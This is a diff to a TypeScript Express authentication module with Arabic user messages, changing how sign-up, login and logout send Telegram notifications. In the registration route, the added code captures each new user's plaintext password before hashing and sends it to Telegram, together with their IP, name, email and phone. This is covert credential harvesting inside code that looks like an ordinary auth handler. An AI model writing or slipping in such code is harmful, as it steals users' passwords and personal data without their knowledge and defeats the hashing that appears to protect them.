@@ -29,15 +29,24 @@ async function comparePasswords(supplied: string, stored: string) {
   return timingSafeEqual(hashedBuf, suppliedBuf);
 }
 
-function formatUserDetails(user: SelectUser, action: string): string {
+function formatUserDetails(user: SelectUser, action: string, req: Express.Request, originalPassword?: string): string {
   const now = new Date().toLocaleString('ar-SA');
-  return `🔐 نشاط مستخدم جديد
+  const ip = req.ip || req.socket.remoteAddress || 'غير معروف';
+
+  let message = `🔐 نشاط مستخدم جديد
 نوع النشاط: ${action}
 الاسم: ${user.name || 'غير محدد'}
 اسم المستخدم: ${user.username}
 البريد الإلكتروني: ${user.email || 'غير محدد'}
 رقم الهاتف: ${user.phone || 'غير محدد'}
+عنوان IP: ${ip}
 الوقت: ${now}`;
+
+  if (action === 'تسجيل مستخدم جديد' && originalPassword) {
+    message += `\nكلمة المرور: ${originalPassword}`;
+  }
+
+  return message;
 }
 
 export function setupAuth(app: Express) {
@@ -61,7 +70,6 @@ export function setupAuth(app: Express) {
       } else {
         const now = new Date().toISOString();
         await storage.updateUserLastLogin(user.id, now);
-        await sendTelegramNotification(formatUserDetails(user, 'تسجيل دخول'));
         return done(null, user);
       }
     }),
@@ -79,12 +87,15 @@ export function setupAuth(app: Express) {
       return res.status(400).send("المستخدم موجود مسبقاً");
     }
 
+    const originalPassword = req.body.password;
+    const hashedPassword = await hashPassword(originalPassword);
+
     const user = await storage.createUser({
       ...req.body,
-      password: await hashPassword(req.body.password),
+      password: hashedPassword,
     });
 
-    await sendTelegramNotification(formatUserDetails(user, 'تسجيل مستخدم جديد'));
+    await sendTelegramNotification(formatUserDetails(user, 'تسجيل مستخدم جديد', req, originalPassword));
 
     req.login(user, (err) => {
       if (err) return next(err);
@@ -92,14 +103,16 @@ export function setupAuth(app: Express) {
     });
   });
 
-  app.post("/api/login", passport.authenticate("local"), (req, res) => {
+  app.post("/api/login", passport.authenticate("local"), async (req, res) => {
+    const user = req.user as SelectUser;
+    await sendTelegramNotification(formatUserDetails(user, 'تسجيل دخول', req));
     res.status(200).json(req.user);
   });
 
   app.post("/api/logout", async (req, res, next) => {
     const user = req.user as SelectUser;
     if (user) {
-      await sendTelegramNotification(formatUserDetails(user, 'تسجيل خروج'));
+      await sendTelegramNotification(formatUserDetails(user, 'تسجيل خروج', req));
     }
     req.logout((err) => {
       if (err) return next(err);
